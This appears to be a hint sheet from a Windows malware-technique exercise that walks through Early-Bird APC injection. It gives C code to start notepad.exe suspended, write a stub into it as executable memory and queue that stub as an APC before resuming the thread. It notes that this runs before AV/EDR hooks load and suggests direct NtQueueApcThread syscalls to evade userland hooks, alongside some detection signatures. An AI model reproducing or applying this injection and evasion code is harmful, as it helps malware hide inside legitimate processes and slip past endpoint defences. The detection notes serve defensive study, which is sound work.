=== HINT 1: CreateProcess suspended ===
BOOL created = CreateProcessA("C:\\Windows\\System32\\notepad.exe",
    NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

=== HINT 2: Allocate + write remote stub ===
LPVOID remote_buf = VirtualAllocEx(pi.hProcess, NULL, sizeof(stub),
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remote_buf, stub, sizeof(stub), NULL);

=== HINT 3: Queue APC before resume ===
DWORD queued = QueueUserAPC((PAPCFUNC)remote_buf, pi.hThread, 0);

=== HINT 4: Resume - APC fires first ===
ResumeThread(pi.hThread);

=== KEY INSIGHT ===
Early-Bird fires BEFORE the process initialises - before DLLs load, before
TLS callbacks, before AV/EDR hooks in the target process are installed.
Compare to standard APC injection: the target must already be running and
in an alertable wait state. Early-Bird has no such requirement.
Detection: scanning for QueueUserAPC followed by ResumeThread on a suspended
process; monitoring VirtualAllocEx + WriteProcessMemory + QueueUserAPC sequence.
Countermeasure: use NtQueueApcThread (ntdll direct) + syscall to avoid userland hooks.
